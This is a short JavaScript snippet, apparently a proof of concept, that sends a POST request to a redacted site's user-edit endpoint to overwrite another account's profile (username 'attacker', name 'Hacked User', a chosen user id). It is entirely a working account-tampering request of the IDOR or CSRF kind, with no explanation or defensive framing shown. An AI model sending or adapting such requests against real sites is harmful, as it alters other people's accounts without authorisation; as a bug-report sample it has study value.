fetch('https://redacted.com/customer/settings/user-edit/update', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'Username=attacker&FirstName=Hacked&LastName=User&Phonenumber=1234567890&id=42296'
});